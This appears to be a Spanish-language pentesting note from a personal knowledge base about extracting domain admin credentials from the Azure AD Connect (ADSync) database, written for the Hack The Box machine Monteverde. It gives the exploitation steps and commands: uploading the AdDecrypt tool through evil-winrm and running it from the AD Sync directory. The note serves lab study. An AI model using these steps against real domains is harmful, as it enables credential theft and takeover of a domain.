
## DESCRIPTION

Si pertenecemos al grupo de Domain Admin y tenemos el privilegio de AdSync es posible obtener las credenciales de ADSync database donde suele estar el usuario administrador del dominio.

Intentará acceder a la base de datos de ADSync en una instancia completa de MS SQL utilizando la autenticación de Windows.

Necesitamos tener privilegios y que esté ejecutandose el programa:
![[Pasted image 20230224184935.png]]
![[Pasted image 20230224184811.png]]

#### Mas información
* https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/
* https://github.com/VbScrub/AdSyncDecrypt
* https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html
* Ver el video del s4vitar


## EXPLOITATION

1. Descargar el zip de la siguiente web: https://github.com/VbScrub/AdSyncDecrypt/releases
2. Descomprimir el zip y subir el ejecutable y la DLL a la máquina victima. [[TRANSFERRING FILES]]
3. Ejecución

**!!NOTA IMPORTANTE!!** 
* Es necesario ejecutar el ejecutable desde la ruta `C:\Program Files\Microsoft Azure AD Sync\Bin`aunque el ejecutable no se encuentre ahí, pero tienes que acceder con cd antes.
```
#Ejemplo de subida de ficheros con Evil-winrm
upload /home/kali/htb/monteverde/privescalation/AdDecrypt.exe
upload /home/kali/htb/monteverde/privescalation/mcrypt.dll

#Accedemos a la ruta para que funcione
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"

#Ejecutamos
c:\programdata\AdDecrypt.exe -FullSQL
```

![[Pasted image 20230224184430.png]]

## MACHINES

* Hack The Box: Monteverde
